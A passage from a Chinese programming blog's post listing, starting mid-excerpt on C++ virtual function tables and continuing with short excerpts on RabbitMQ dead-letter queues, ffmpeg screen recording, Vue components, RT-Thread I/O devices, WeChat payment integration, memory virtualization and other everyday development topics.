对于派生类来说，编译器建立虚函数表的过程其实一共是三个步骤：
拷贝基类的虚函数表，如果是多继承，就拷贝每个有虚函数基类的虚函数表当然还有一个基类的虚函数表和派生类自身的虚函数表共⽤了⼀个虚函数表，也称为某个基类为派生类的主记录查看派生类中是否有重写基类中的虚函数，如果有，就替换成已经重写的虚函数地址；查看派生类是否有自身的虚函数，如果有，就追加自身的虚函数到自身的虚函数表中 Derived *pd = new D(); B *pb = pd; C *pc = pd; 其中 pb，pd，pc 的指针位置是不同的，要注意的是派⽣类的⾃身的内容要追加在主基类的内存块后。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/412edb3b8d3bb782d804ce3c2d5f830c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0f9daa423041c0c85de830a283dc2e6f/" rel="bookmark">
			六、死信队列
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		RabbitMQ目录
文章目录 死信队列1、死信的概念2、死信的来源3、死信实战3.1. 代码架构图3.2. 消息TTL 过期3.3. 队列达到最大长度3.4. 消息被拒 死信队列 1、死信的概念 先从概念解释上搞清楚这个定义，死信，顾名思义就是无法被消费的消息，字面意思可以这样理解，一般来说，producer 将消息投递到 broker 或者直接到queue 里了，consumer 从 queue 取出消息进行消费，但某些时候由于特定的原因导致 queue 中的某些消息无法被消费，这样的消息如果没有后续的处理，就变成了死信，有死信自然就有了死信队列。
应用场景：为了保证订单业务的消息数据不丢失，需要使用到 RabbitMQ 的死信队列机制，当消息消费发生异常时，将消息投入死信队列中。还有比如说：用户在商城下单成功并点击去支付后在指定时间未支付时自动失效。
2、死信的来源 消息 TTL（存活时间） 过期
队列达到最大长度(队列满了，无法再添加数据到队列中)
消息被拒绝（消费方拒绝应答：basic.reject 或 basic.nack）并且（不放回队列中： requeue=false）
3、死信实战 3.1. 代码架构图 描述：一个生产者，两个消费者，有一个正常的交换机，类型为direct，路由模式。一个消息正常发给消费者C1，结果出现了上面描述的三种情况：消息 TTL 过期、队列达到最大长度、消息被拒绝，消息成为死信，之后消息被转发到（死信交换机）ded_exchange，类型也为direct，之后进入死信队列，最终由消费者C2消费。
代码核心部分在C1。
3.2. 消息TTL 过期 先启动C1，让其创建正常交换机、死信交换机、正常队列、死信队列，以及之间的绑定关系，之后关闭C1，生产者发送消息，这是模拟“消息TTL 过期”。之后启动C2去消息死信队列中的消息。
消费者 C1 代码 (启动之后关闭该消费者 模拟其接收不到消息)
package com.wlw.rabbitmq.eight; import com.rabbitmq.client.BuiltinExchangeType; import com.rabbitmq.client.Channel; import com.rabbitmq.client.DeliverCallback; import com.wlw.rabbitmq.utils.RabbitMqUtils; import java.util.HashMap; import java.util.Map; /** * 死信队列 消费者C1 */ public class Consumer01 { //正常交换机名称 private static final String NORMAL_EXCHANGE = "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0f9daa423041c0c85de830a283dc2e6f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f7535d4d7724665ffbd969f9ff27a90b/" rel="bookmark">
			ffmpeg录屏
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		qt + ffmpeg屏幕录制软件 完整工程链接：https://download.csdn.net/download/weixin_42538789/85013858
测试代码
#include &lt;QtCore/QCoreApplication&gt; #include "screencapture.h" #include &lt;iostream&gt; using namespace std; int main(int argc, char *argv[]) { QCoreApplication a(argc, argv); ScreenCapture* capture = new ScreenCapture(); capture-&gt;start(); while (true) { string str; cin &gt;&gt; str; if (str == "q") { capture-&gt;setStop(true); break; } } return a.exec(); } 头文件screencapture.h
#ifndef SCREEN_CAPTURE_H #define SCREEN_CAPTURE_H #include &lt;QThread&gt; #include &lt;QTcpSocket&gt; extern "C" { #include "libavformat/avformat.h" #include "libavutil/ffversion.h" #include "libavcodec/avcodec.h" #include "libswscale/swscale.h" #include "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f7535d4d7724665ffbd969f9ff27a90b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4274b28b69b98116b800321a7ecd5653/" rel="bookmark">
			ubuntu物理机用virtualbox安装win7进行单片机实验
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		由于听说linux在物理机上字节安装会比安装双系统还有WSL好，所以直接装了物理机，这学期嵌入式课程需要用Keil和proteus，所以安装virtualbox。还有其他方案，比如play on Linux
、Wine、双系统。
安装过程在csdn上有不少文章，我记录一下我遇到的其他人没有提到的问题。
一： To re-start the set-up process, run /sbin/vboxconfig as root. If your system is using EFI Secure Boot you may need to sign the kernel modules (vboxdrv, vboxnetflt, vboxnetadp, vboxpci) before you can load them. Please see your Linux system's documentation for more information. 解决方法：sudo apt install --reinstall virtualbox-dkms + kernel - Could not load 'vboxdrv' after upgrade to Ubuntu 16.04 (and I want to keep secure boot) - Ask Ubuntu
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4274b28b69b98116b800321a7ecd5653/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7df9016ed11dc8fe6573b3c0b9085f65/" rel="bookmark">
			C语言-判断语句if-else
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		C语言中用来表示判断的语句是if-else语句，其一般形式为：
if(表达式) 语句1; else 语句2; 其流程图如下：
该语句用于实现分支结构，根据表达式的值选择语句1或者语句2中的1条执行。从流程图中可以看到，首先求解表达式，如果表达式的值为“真”，则执行语句1；如果表达式的值为“假”，则执行语句2。 if-else语句常用于二分段函数的计算，例如上篇文章的函数： $$y=f(x) = \begin{cases} \frac{4x}{3} &amp; x \leq 15 \\ 2.5x-10.5 &amp; x &gt; 15 \end{cases} $$ 用if-else语句写的代码段： /*if-else语句*/ if (x &lt;= 15){ y = 4*x/3;	/* x&lt;=15为真时执行 */ }else{ y = 2.5*x-10.5; /* x&lt;=15为假（即x&gt;15）时执行*/ } 注：1、if后面小括号后不能有分号；例如if (x&gt;3);这个是错误的，分号不能有，应该是if (x&gt;3)。
2、if-else语句中的表达式一般为关系表达式，例如if(x&gt;3)或者if(x==2)等，同时也可以使用数字，例如if (1)或者if (0)，但是需要注意，除0之外的所有数字都恒为"真"，只有if (0)是假。
3、if-else语句中关系表达式中的==不能写赋值符号=，以为赋值在C语言中结果永远为"真"，而且编译器不报错，在这种错误比较隐晦，不好查找。例如if(x==2)千万不能写成if(x=2)；
if (x==2) 语句1; //语句1仅当x==2时才会执行 if (x=2) 语句2; //语句2无论x之前是什么值都会执行，赋值语句永远为真。	为了避免出现写错的情况，可以改写成如下的语句：即将常数放在左边，因为不能给常数赋值，变量才可以赋值。这样写编译器会报错，有利于避免一些逻辑错误！
if (2==x) 语句1; if (2=x) //此时编译器会报错，常数是不能赋值的 语句1; 报错:[Error] lvalue required as left operand of assignment（左值要是一个变量的左操作数） 3、if-else一般后面都跟着大括号，这样就会执行其中一条分支大括号内的所有语句；如果仅执行一条语句，可以不加大括号，但是此时仅紧接着表达式的第一条语句属于if语句管辖，else和if是一样的；但是else语句前必须有一个与之相对应的if语句，如果前面的if语句后不加大括号，并且跟了不只一条语句，此时编译器会报错。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7df9016ed11dc8fe6573b3c0b9085f65/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/391883956da3a55b8241ce6b226b5fbb/" rel="bookmark">
			Modified Polygon (Allow modified: No), (Allow shelved: No)/修改的多边形（允许修改：否）（允许搁置：否）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 AD软件规则检查时报错 解决方法 BUG解决了 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/561f9ab5ed307be7bfd8e2f610ff2e23/" rel="bookmark">
			用vscode开发和调试golang超简单教程
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		首先安装golang开发环境，这个不用说。
到这个页面下载golang 的安装包 Go下载 - Go语言中文网 - Golang中文社区 ，再安装就可以了。
一、下载并安装vscode Visual Studio Code - Code Editing. Redefined
二、安装Go插件 在vscode插件中搜索Go的开发插件，安装后如图所示
(不包含c++那个）
三、下载并编译go语言调试工具 使用vscode 安装go语言扩展包后，只要你打开一个.go文件，vscode就会提示你下载go相关调试和开发的exe工具，国内因为墙的原因，经常失败。
此时需要设置go 的代理，剩下的工作就自动会完成的。
go env -w GOPROXY=https://goproxy.cn,direct 编译好的各个工具会在C:\Users\Lenovo\go\bin目录下。
bin/ 目录下主要包括以下几个工具：
程序名程序用途dlv.exego 语言调试工具gocode.exego语言代码检查，自动补全godef.exe go语言代码定义和引用的跳转golint.exe go语言代码规范检查go-outline.exe 用于在Go源文件中提取JSON形式声明的简单工具gopkgs.exe 快速列出可用包的工具gorename.exe 在Go源代码中执行标识符的精确类型安全重命名goreturns.exe 类似fmt和import的工具，使用零值填充Go返回语句以匹配func返回类型go-symbols.exe 从go源码树中提取JSON形式的包符号的工具gotour.exe go语言指南网页版guru.exe go语言源代码有关工具，如代码高亮等 四、打开现有go工程文件夹或新建go项目即可进行调试 打开main.go，按F5开始调试，如果没有编译错误可以看到，变量显示，调用堆栈的显示还是非常清晰的，可以F10单步，F11进入函数，跟一般Visual Studio 一样了。
我也试用过liteIDE， x35是当前的最新版，liteIDE非常轻量，是中国人开发的，用起来还是很好用的，但是目前在调试方面个人感觉还有一些不太让人满意的地方，变量显示比较难，遇到go func() 无法调试，经常无法捕获断点。
五、问题处理 按F5调试 可能会弹出
最大的原因可能是因为，VS code当前打开的文档不是main.go ,就那个包含main函数的go文件。
解决方法就是点击打开 main.go ,再按F5进行调试。
另一种解决方法是修改launch.json,
把program那个变量的值改一下，改成 "program": "${workspaceFolder}", 意思是调试的时候，以当前打开的文件夹根目录作为工程目录进行调试。
{ // 使用 IntelliSense 了解相关属性。 // 悬停以查看现有属性的描述。 // 欲了解更多信息，请访问: https://go.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/561f9ab5ed307be7bfd8e2f610ff2e23/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f90810480724392098ea96ff585b473b/" rel="bookmark">
			Design contains shelved or modified (but not repoured) polygons. The result of DRC is not correct.
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 首先翻译一下英文意思from百度翻译
Design contains shelved or modified (but not repoured) polygons. The result of DRC is not correct. 设计包含搁置或修改（但不重新放置）的多边形。DRC的结果是不正确的。 原因分析： 出现这样报错的，可以在AD的PCB界面看到报警的地方在哪里，如下图
报警的地方有2个： 1.丝印与焊盘之间的距离报警 2.丝印与丝印之间或者丝印本身距离报警
解决方法：在规则里面找到下图选项，把相应的距离修改一下即可
如上图所示，当你修改为相应的距离值=0mil 后，点Apply(应用) ，然后再点击(OK)
BUG解决了 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b27d56d9f339c71149427f0a3f760687/" rel="bookmark">
			批量重命名指定格式/类型/后缀文件——python实现
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、使用注意 使用时，请修改第7行文件夹名，第15行需要批量重命名的文件后缀，第17行重命名格式（后缀也可修改）
二、程序 #!/usr/bin/env python # -*- coding: utf-8 -*- import os class ImageRename(): def __init__(self): self.path = 'C:/Users/CNXIGAO13/Desktop/lights' # 指定文件夹 def rename(self): filelist = os.listdir(self.path) total_num = len(filelist) i = 0 for item in filelist: if item.endswith('.jpg'): # 文件夹下需要批量重命名文件后缀，可修改 src = os.path.join(os.path.abspath(self.path), item) dst = os.path.join(os.path.abspath(self.path), '0' + format(str(i+1)) + '.jpg') # 重命名格式，后缀，可修改 os.rename(src, dst) print('converting %s to %s ...' % (src, dst)) i = i + 1 print('total %d to rename &amp; converted %d jpgs' % (total_num, i)) if __name__ == '__main__': newname = ImageRename() newname.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b27d56d9f339c71149427f0a3f760687/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2eb12ff6903138d5dc5d33ea6b015050/" rel="bookmark">
			vue 如何写一个消息通知组件$notify，简单易懂，你上你也行
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		废话少说，上效果图
前言
本人在做毕设的时候用elementui写页面的时候，觉得这个通知很有趣，可以用一个命令（this.$notify)这样子调用，很神奇。所以打算自己封装一个，以后就可以随便调用了。
第一步：创建这个通知的模板
首先，你在vue的项目里面，找个合适的位置创建一个文件夹，创建一个vue的文件以及一个js文件
代码如下
myNotify.vue
我通过 transition 实现过渡，v-if 来决定显示类型，其他的就是一些样式了（个人觉得这样写挺冗余的，可以改进）
&lt;template&gt; &lt;transition name="slide-fade"&gt; &lt;div class="my-notify" v-if="notifyFlag"&gt; &lt;div class="notify success" v-if="type=='success'"&gt; &lt;div class="tip"&gt; &lt;span&gt;成功&lt;/span&gt; &lt;/div&gt; &lt;div class="content"&gt; {{content}}&lt;/div&gt; &lt;/div&gt; &lt;div class="notify error" v-else-if="type=='error'"&gt; &lt;div class="tip"&gt; &lt;span&gt;错误&lt;/span&gt; &lt;/div&gt; &lt;div class="content"&gt;{{content}}&lt;/div&gt; &lt;/div&gt; &lt;div class="notify warning" v-else-if="type=='warning'"&gt; &lt;div class="tip"&gt; &lt;span&gt;警告&lt;/span&gt; &lt;/div&gt; &lt;div class="content"&gt;{{content}}&lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/transition&gt; &lt;/template&gt; &lt;style scoped&gt; .slide-fade-leave-active { transition: all .2s cubic-bezier(1.0, 0.5, 0.8, 1.0); } .slide-fade-enter, .slide-fade-leave-to{ transform: translateX(10px); opacity: 0; } .
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2eb12ff6903138d5dc5d33ea6b015050/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f19d606b2c6864a7ec5626493491e51d/" rel="bookmark">
			Pyts入门之时间序列的分类---TimeSeriesBOF算法（六）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		简介 时间序列分类算法的最后一篇，本算法全名叫做Time Series Bag-of-Features算法，相当于上一节TimeSeriesForest算法的改进版或者说复杂版，具体改进在以下两点：
1.特征提取的方式从单层提取变为双层提取。
2.用Stacking的方式改善了分类器的性能。
所以个人更喜欢叫它时间序列随机森林的堆叠模型。
算法的具体过程为：
1.跟上节一样，先在主序列上随机抽取子序列。
2.将子序列进一步分割为子间隔。
3.在子间隔上抽取平均值，标准差，斜率三个特征（上节是在子序列上）。
4.在子序列上抽取平均值，标准差，起点，和终点四个特征。
5.将以上七个特征和子序列的标签（从哪个主序列抽出来就沿用哪个主序列的标签）输入随机森林模型一。
6.导出随机森林模型一的袋外分数进行分箱和取平均数。
7.将第六步得到的特征再输入随机森林模型二进行拟合，得到最终的分类模型。
所以说这实际是一个Stacking的过程，我们将第一个模型的决策函数值输入了第二个模型作为特征值使用。
闲言碎语 个人的一些抱怨，不想看的直接跳过吧。之前在公司整了一个用来做视频预处理的深度学习模型，今天上班的时候听到同事之间交流说总经理让他用C++开发一个移动端的视频预处理的东西，言下之意就是不跟我说就直接把我这个东西替换掉？这个同事甚至不懂opencv，而且这个任务用深度学习做的准确率可比传统方法高多了，速度也不差，真的把AI当成什么了？一点都不尊重人的，反正这公司里也就我一个搞AI的，可能那些人觉得这些东西很简单随便找点开源的东西就能替代吧呵呵。我早上听到这消息，写博客写到现在手都气抖了，真的想辞职啊。后面和总经理吵了一架，现在非常后悔，我一生气就非常上头
API class pyts.classification.TSBF(n_estimators=500, min_subsequence_size=0.5, min_interval_size=0.1, n_subsequences='auto', bins=10, criterion='entropy', max_depth=None, min_samples_split=2, min_samples_leaf=1, min_weight_fraction_leaf=0.0, max_features='auto', max_leaf_nodes=None, min_impurity_decrease=0.0, bootstrap=True, oob_score=False, n_jobs=None, random_state=None, verbose=0, class_weight=None, ccp_alpha=0.0, max_samples=None) 参数列表n_estimatorsint，森林里树的数目，太多容易过拟合，太少容易信息不足min_subsequence_sizeint or float，子序列的最小长度，若为小数则为序列长度乘该值，由于在代码中有向下取整的过程，所以实际可能会比设定的长度要小一些min_interval_sizeint or float，最小间隔长度，若为小数则为序列长度乘该值，必须比子序列的最小长度小n_subsequencesint or float，子序列的个数，若为小数则为序列长度乘该值，如果为’auto’，则会自动计算要抽多少子序列binsint or array-like，为整数则在[0,1]之间划分相同的箱子，传数组则表示自定义增加的分箱边缘criterion“gini”或“entropy”，节点划分的准则max_depthint or None,树的深度限制，可以不设，但容易过拟合min_samples_splitint or float，划分内部节点（能继续分出节点的节点）需包含的最小样本数，若为float，则为向上取整(min_samples_split * 样本数)min_samples_leafint or float，叶节点包含的最小样本数，若为float，则为向上取整(min_samples_leaf * 样本数)，可能可以平滑模型min_weight_fraction_leaffloat，成为叶节点的最小权重分数，当fit时没有提供sample_weight参数时所有样本都有相同的权重max_featuresint, float, str or None，一般为“auto”即可，划分时考虑的最多特征数目。若为float，则max_features=round(max_features * n_features)，若为“auto”或“sqrt”，max_features=sqrt(n_features)，若为“log2”, max_features=log2(n_features)，若为None，max_features=n_features。max_leaf_nodesint，叶节点的最多数目min_impurity_decreasefloat，最小不纯度的减少，一个节点划分减少的不纯度大于等于这个值时才会被划分bootstrapbool，是否使用boostrap方法来构建每棵树，若为False，则会使用整个样本集。oob_scorebool，是否使用袋外分数来进行评分，只有bootstrap为True时，才会有一部分从来没有被抽中的样本来评分n_jobsint or None，线程数，-1时用尽所有random_stateint, RandomState instance or None，随机种子，影响两个过程：1.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f19d606b2c6864a7ec5626493491e51d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e9de7b9067ac8ef7698ddcac23fab830/" rel="bookmark">
			C&#43;&#43;统计每门课程全班的总成绩和平均成绩以及每个学生课程的总成绩和平均成绩。
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		输入学生人数（最多为50个人），然后按编号从小到大的顺序依次输入学生成绩（语文、数学和英语3门课程的成绩），最后统计每门课程全班的总成绩和平均成绩以及每个学生课程的总成绩和平均成绩
#include&lt;iostream&gt;
#include&lt;string.h&gt;
using namespace std;
main(){
int no=0;//学生人数 XS
int CS=0,MS=0,ES=0;//语文、数学。英语 YW.SX.YY
float PC=0,PM=0,PE=0;//平均成绩语文。平均成绩数学。平均成绩英语 PJYW PJSX PJYY
float SS=0;//学生平均成绩 PJXS
while (no&lt;=0||no&gt;50){
cout&lt;&lt;"输入学生人数（最多为50个人）：";
cin&gt;&gt;no;
}
struct student{
int chinese;
int maths;
int english;
}stu[no];
for(int i=0;i&lt;no;i++){
cout&lt;&lt;"请输入第"&lt;&lt;(i+1)&lt;&lt;"名学生语文成绩：";
cin&gt;&gt;stu[i].chinese;
cout&lt;&lt;"请输入第"&lt;&lt;(i+1)&lt;&lt;"名学生数学成绩：";
cin&gt;&gt;stu[i].maths;
cout&lt;&lt;"请输入第"&lt;&lt;(i+1)&lt;&lt;"名学生英语成绩：";
cin&gt;&gt;stu[i].english;
cout&lt;&lt;endl;
}
for(int i=0;i&lt;no;i++){
SS=(stu[i].chinese+stu[i].maths+stu[i].english);
CS+=stu[i].chinese;
MS+=stu[i].maths;
ES+=stu[i].english;
cout&lt;&lt;"第"&lt;&lt;(i+1)&lt;&lt;"名学生的课程总成绩为："&lt;&lt;SS&lt;&lt;"\t平均成绩为："&lt;&lt;SS/3&lt;&lt;endl;
}
PC=CS/no;PM=MS/no;PE=ES/no;
cout&lt;&lt;"\n"&lt;&lt;endl;
cout&lt;&lt;"全班每门课程的总成绩：语文:"&lt;&lt;CS&lt;&lt;"\t数学:"&lt;&lt;MS&lt;&lt;"\t英语:"&lt;&lt;ES&lt;&lt;endl;
cout&lt;&lt;"全班每门课程的平均成绩：语文:"&lt;&lt;PC&lt;&lt;"\t数学:"&lt;&lt;PM&lt;&lt;"\t英语:"&lt;&lt;PE;
}
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1a35ea4749e6a52006e92804cda83541/" rel="bookmark">
			ant design vue 清空upload组件图片缓存的方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		当关闭这个窗口后，再次打开，上传上传的图片清空
在upload 这个组件外加一个key 赋随机值，便可清除缓存缓存
代码如下：
&lt;a-modal v-model="visible" title="AddComponents" @ok="handleOk"&gt; &lt;a-form-model-item label="Image"&gt; &lt;div :key="ImgKey"&gt; &lt;imgUpload @uploadFileList="uploadFileList" model="moudleImg" :isOpen="isOpen" :file="fileList" &gt;&lt;/imgUpload&gt; &lt;/div&gt; &lt;/a-form-model-item&gt; &lt;/a-form-model&gt; &lt;/a-modal&gt; export default { data() { return { visible: false, ImgKey: '' } }, watch: { visible() { if (this.visible) { this.ImgKey = '' } else { this.ImgKey = Math.random() } console.log('this.ImgKey :&gt;&gt; ', this.ImgKey) }, }, } 这里给了一个随机数是为了防止污染其他key值。
当然，不用监听用事件触发也行。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/593c3b06c403821710c50515b91154e4/" rel="bookmark">
			RT_threadのIO设备学习笔记
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		总结：
RT_thread有一套I/O设备模型框架，如下图：
图1 I/O设备模型框架 设备驱动通过函数rt_device_register将自己注册到IO设备管理器。应用程序可以使用函数rt_device_find查找设备；使用函数rt_device_open打开设备；使用函数rt_device_read读取设备数据；使用函数rt_device_close关闭设备。 RT_thread的设备模型是建立在内核对象模型基础之上的，每个设备都有继承关系，如图： 图2 设备继承关系 IO设备内核代码解析 在rtdef.h文件里面列出了RT_thread的IO设备类型：
/** * device (I/O) class type */ enum rt_device_class_type { RT_Device_Class_Char = 0, /**字符设备 */ RT_Device_Class_Block, /**块设备 */ RT_Device_Class_NetIf, /**网络接口设备 */ RT_Device_Class_MTD, /**内存设备 */ RT_Device_Class_CAN, /**&lt; CAN设备 */ RT_Device_Class_RTC, /**&lt; RTC设备*/ RT_Device_Class_Sound, /**声音设备 */ RT_Device_Class_Graphic, /**图形设备 */ RT_Device_Class_I2CBUS, /**I2C总线设备*/ RT_Device_Class_USBDevice, /**USB设备 */ RT_Device_Class_USBHost, /**USB host总线 */ RT_Device_Class_SPIBUS, /**SPI总线设备*/ RT_Device_Class_SPIDevice, /**SPI device */ RT_Device_Class_SDIO, /**SDIO总线设备 */ RT_Device_Class_PM, /**PM pseudo device */ RT_Device_Class_Pipe, /**Pipe device */ RT_Device_Class_Portal, /**Portal device */ RT_Device_Class_Timer, /**Timer device */ RT_Device_Class_Miscellaneous, /**杂类设备 */ RT_Device_Class_Sensor, /**传感设备 */ RT_Device_Class_Unknown /**unknown device */ }; 在学习RT_thread的IO设备之前，有必要了解下设备对象的相关结构体：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/593c3b06c403821710c50515b91154e4/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4ed5c3395a1055fb61a88f9f27333097/" rel="bookmark">
			微信点金计划接入详细步骤
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 前言一、开通点金计划二、配置点金计划的商家小票三、编写商家小票界面四 、调试商家小票五、申请证书六、签名Q&amp;A 问答1. 想更换调试接口人该如何进行？2. 如何解除特约商户？3. 特约商户中商家小票的广告利益去哪获取？4、为什么查询微信订单接口时返回：普通商户不允许传sub_mch_ic？5、商家小票为什么出现Failed to execute 'postMessage' on 'DOMWindow': The target origin provided ('https://payapp.weixin.qq.com') does not match the recipient window's origin ('xxx')？ 前言 在之前，普通的JSAPI调用跳转到自定义界面的功能还是存在的，而在2020/6，微信公告了特约商户与普通商户跳转自定义界面的功能区别开了。特约商户只有开通了点金计划才可以跳转自定义界面，否则付款完成后将直接关闭完成界面。
这里是先介绍整体流程，然后最后是我所踩的坑的解答。
点金计划文档：https://wx.gtimg.com/pay/download/goldplan/goldplan_product_description_v2.1.pdf
官方的文档中的查询订单接口文档是V2版本相关文档：https://pay.weixin.qq.com/wiki/doc/api/index.html
根据自己的支付方式对接响应的支付接口
根据我后期与客户沟通用V3是最好的（文档下面会有V3接口链接），因为V2我在某个文档看好像会停用。
最后创作不易，多多支持一下！
一、开通点金计划 自行登录微信服务商平台https://pay.weixin.qq.com/index.php/core/home/login一次点击服务商功能–&gt;点金计划–&gt;开通计划 3. 填写接口人员最多填写5个，这个功能用来给开发者来调试点金计划的页面
二、配置点金计划的商家小票 在点金计划页面点击【商家小票链接配置】，在如图所在的位置，我这边已经是配置好了。
下载微信验证文件 自定义一个路径用来返回一个商家小票的界面
如：商家小票的页面的路径为：https://www.aaa.com/ym/customerpage
或者放在服务器的可能为：https://www.aaa.com/ym/customerpage.html将下载好的微信验证文件放在访问商家小票的路径下如：https://www.aaa.com/ym/微信验证文件，必须在同一个目录下，即在ym下将商家小票的页面路径写进商家小票连接的框中https://www.aaa.com/ym/customerpage或https://www.aaa.com/ym/customerpage.html，这是点提交微信会自动通过商家小票的根路径去寻找微信验证文件的内容进行匹配 三、编写商家小票界面 为了大家方便直接复制以下代码，自行修改即可
&lt;!DOCTYPE html&gt; &lt;html lang="en"&gt; &lt;head&gt; &lt;meta charset="utf-8"&gt; &lt;meta http-equiv="X-UA-Compatible" content="IE=edge"&gt; &lt;meta name="referrer" content="origin"&gt; &lt;meta name="viewport" content="width=device-width, viewport-fit=cover, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no"&gt; &lt;meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate"
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4ed5c3395a1055fb61a88f9f27333097/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/89ca61571cf9bcc48bd4c400575eefbc/" rel="bookmark">
			内存虚拟化
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、实地址是没有内存保护的，一个程序可以访问整个1M的地址空间
2、最开始的8086地址线有20根数据总线最大宽度是16，正常只能寻址2^16，后面的实模式下的逻辑地址的计算都是基地址加偏移地址来算，深度探索linux系统虚拟化这本书里写了最开始是搞了四个段寄存器 cs ds es ss，个人理解就是最开始你可以选哪个段，物理地址被分成了几段，然后每一段你都可以去寻1M的地址。
不过后续都是平坦内存模型了已经不用上面这个了
什么是平坦内存模型呢？
郭健： Linux内存模型——平坦、非连续与稀疏_Linux阅码场的博客-CSDN博客
这里可以先去看一下这个博客了解一些基础。
平坦内存模型，介绍最多的就是段基地址是0，也就是说我的物理内存的寻址方式的，基地址都是0，那会不会就导致寻址范围变小呢？
首先平坦内存模型建立了四个段：
特权级3的用户代码段 数据段
特权级0的内核代码段 数据段
这4个段基地址都是0，很奇怪是吧
他咋区分，咋去访问地址呢？
这里引入了段描述符的概念
31~24就是刚刚的基地址他是0
G是单位设置 0就是以字节为单位 1就是以4KB为单位
TYPE表示是代码段还是数据段
段界限表示段的长度单位依赖于TYPE
这里我们上面说了他分四段，内核用户的代码和数据段，怎么分的呢？
看段描述符的0~15位，这里他有个名字叫做段选择子，这里配置了我们是内核用户的哪一段，还有我们是GDT 还是LDT，全局还是局部描述符，这两个概念要记住只有在保护模式里才有，因为这个段描述符里涉及了一些权限的东西，实模式没有这些，没有内存保护。
此外我看到这还有个疑问这个能寻多大的地址呢？
这里主要是看G的粒度0以字节为单位就比较小1·1M，1以4KB为单位就是4K~4G
这里想到段机制和我的分页机制的区别是什么呢？
首先实模式是生成逻辑地址
段机制是保护模式里面的（看上下猜这里是生成虚拟地址也就是线性地址的地方），但是这里要记住我如果没有分页，那段机制的生成的线性地址就是物理地址。（补充下：线性地址特指段模式生成的地址，他可以是虚拟地址也可以是物理地址）
页表机制是将虚拟地址转为逻辑地址
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/826a2f3d7389c4c4a6eda2420cc4fa77/" rel="bookmark">
			java线程池工具类
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一：实现线程的三种方式
1. 继承 Thread 类
2. 实现Runnable 接口
3. 实现 Callbale接口和Future接口实现
4. 三种方式比较：
继承Thread 类 编程简单，可扩展性差。
实现接口方式 可扩展性高，编程复杂。
二：使用ThreadPoolExecutor编写线程池工具类
1. 线程创建方式，实例化贤臣池时，创建核心线程，
2. 当任务大于核心线程时将进入阻塞队列
3. 当阻塞队列满时，任务没有超过最大线程时创建新的线程
4. 当任务 &gt; 最大线程数+阻塞队列 时，执行拒绝策略。
